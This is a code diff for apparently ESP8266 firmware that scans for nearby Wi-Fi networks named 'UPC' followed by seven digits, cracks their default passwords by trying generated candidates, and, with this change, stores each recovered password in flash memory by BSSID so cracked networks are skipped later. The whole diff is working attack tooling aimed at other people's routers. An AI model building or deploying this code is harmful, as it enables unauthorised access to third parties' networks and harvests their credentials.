@@ -8,13 +8,13 @@
 #include "user_interface.h"
 
 typedef struct {
-  uint32_t target;
-  unsigned char essid[32];
-  uint8_t bssid[6];
-  uint8_t password[9];
-  int8_t priority;
-  char *candidate_passwords;
-  size_t current_password;
+    uint32_t target;
+    uint8_t essid[32];
+    uint8_t bssid[6];
+    uint8_t password[8];
+    int8_t priority;
+    char *candidate_passwords;
+    size_t current_password;
 } ap_t;
 
 // counter for APs seen
@@ -36,6 +36,12 @@ static void targets_found(void* arg, STATUS status);
 #define user_procTaskQueueLen 1
 os_event_t user_procTaskQueue[user_procTaskQueueLen];
 
+typedef struct {
+    uint8_t bssid[6];
+    uint8_t password[8];
+    //uint8_t padding[2];
+} saved_ap_t;
+
 ICACHE_FLASH_ATTR
 static void
 scan(os_event_t *events)
@@ -46,6 +52,21 @@ scan(os_event_t *events)
     } else {
         os_printf("Error: not in scanning state\n");
     }
+}
+
+ICACHE_FLASH_ATTR
+static void load_password(size_t ap_to_crack){
+    saved_ap_t saved_ap;
+    size_t saved_aps = 0;
+    do {
+        spi_flash_read(USER_FLASH_START + (saved_aps*sizeof(saved_ap_t)), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
+        if(memcmp(saved_ap.bssid, aps[ap_to_crack].bssid, 6) == 0){
+            memcpy(aps[ap_to_crack].password, saved_ap.password, 8);
+            os_printf("Loaded saved password %s for ESSID %s in slot %u\n", aps[ap_to_crack].password, aps[ap_to_crack].essid, saved_aps);
+            break;
+        }
+        saved_aps++;
+    } while(saved_ap.password[0] != 0xff && (saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))));
 }
 
 // callback for scan
@@ -59,14 +80,14 @@ targets_found(void* arg, STATUS status){
         for(i = 0; i < aps_found; i++){
             if(aps[i].target && aps[i].priority){
                 os_printf("Found target ESSID %s with priority %u...\n", aps[i].essid, aps[i].priority);
-                if(!aps[i].candidate_passwords){
-                    os_printf("Generating candidate passwords for ESSID %s...\n", aps[i].essid);
-                    state = CRACKING;
-                    system_os_post(PRIO_CRACK, 0, (os_param_t) i);
-                } else {
+                if(aps[i].candidate_passwords){
                     os_printf("Connecting to ESSID %s...\n", aps[i].essid);
                     state = CONNECTING;
                     system_os_post(PRIO_TEST, 0, (os_param_t) i);
+                } else {
+                    os_printf("Generating candidate passwords for ESSID %s...\n", aps[i].essid);
+                    state = CRACKING;
+                    system_os_post(PRIO_CRACK, 0, (os_param_t) i);
                 }
                 return;
             }
@@ -85,12 +106,16 @@ targets_found(void* arg, STATUS status){
             memcpy(aps[aps_found].essid, bss_link->ssid, 32);
             aps[aps_found].target = 0;
             aps[aps_found].candidate_passwords = NULL;
-            if(strncmp(aps[aps_found].essid, "UPC", 3) == 0 && strlen(aps[aps_found].essid) == 10){
-                for(i = 3; i < 10; i++){
-                    aps[aps_found].target *= 10;
-                    aps[aps_found].target += aps[aps_found].essid[i]-0x30;
+
+            load_password(aps_found);
+            if(!aps[aps_found].password[0]){
+                if(strncmp(aps[aps_found].essid, "UPC", 3) == 0 && strlen(aps[aps_found].essid) == 10){
+                    for(i = 3; i < 10; i++){
+                        aps[aps_found].target *= 10;
+                        aps[aps_found].target += aps[aps_found].essid[i]-0x30;
+                    }
+                    aps[aps_found].priority++;
                 }
-                aps[aps_found].priority++;
             }
             aps_found++;
         }
@@ -99,6 +124,24 @@ targets_found(void* arg, STATUS status){
     }
     state = SCANNING;
     system_os_post(PRIO_SCAN, 0, 0 );
+}
+
+ICACHE_FLASH_ATTR
+static void save_password(size_t ap_to_crack){
+    saved_ap_t saved_ap;
+    size_t saved_aps = 0;
+    do {
+        spi_flash_read(USER_FLASH_START + (saved_aps*sizeof(saved_ap_t)), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
+        saved_aps++;
+    } while(saved_ap.password[0] != 0xff && (saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))));
+    if(saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))){
+        os_printf("Saving password %s for ESSID %s in slot %u\n", aps[ap_to_crack].password, aps[ap_to_crack].essid, saved_aps - 1);
+        memcpy(saved_ap.bssid, aps[ap_to_crack].bssid, 6);
+        memcpy(saved_ap.password, aps[ap_to_crack].password, 8);
+        spi_flash_write(USER_FLASH_START + (saved_aps-1)*sizeof(saved_ap_t), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
+    } else {
+        os_printf("User flash area is full!\n");
+    }
 }
 
 ICACHE_FLASH_ATTR
@@ -124,8 +167,10 @@ static void test_passwords(os_event_t *events){
                 state = DISCONNECTING;
                 memcpy(aps[ap_to_crack].password, "UNKNOWN", 7);
                 aps[ap_to_crack].priority = 0;
+                aps[ap_to_crack].target = 0;
                 os_free(aps[ap_to_crack].candidate_passwords);
                 aps[ap_to_crack].candidate_passwords = NULL;
+                save_password(ap_to_crack);
             }
 
         } else {
@@ -178,8 +223,11 @@ static void test_passwords(os_event_t *events){
             memcpy(aps[ap_to_crack].password, aps[ap_to_crack].candidate_passwords+(8*aps[ap_to_crack].current_password), 8);
             os_printf("Found valid password for %s: %s\n", aps[ap_to_crack].essid, aps[ap_to_crack].password);
             aps[ap_to_crack].priority = 0;
+            aps[ap_to_crack].target = 0;
             os_free(aps[ap_to_crack].candidate_passwords);
             aps[ap_to_crack].candidate_passwords = NULL;
+            save_password(ap_to_crack);
+            os_printf("Saved password to user flash\n");
             // no need to test more
             state = DISCONNECTING;
             break;
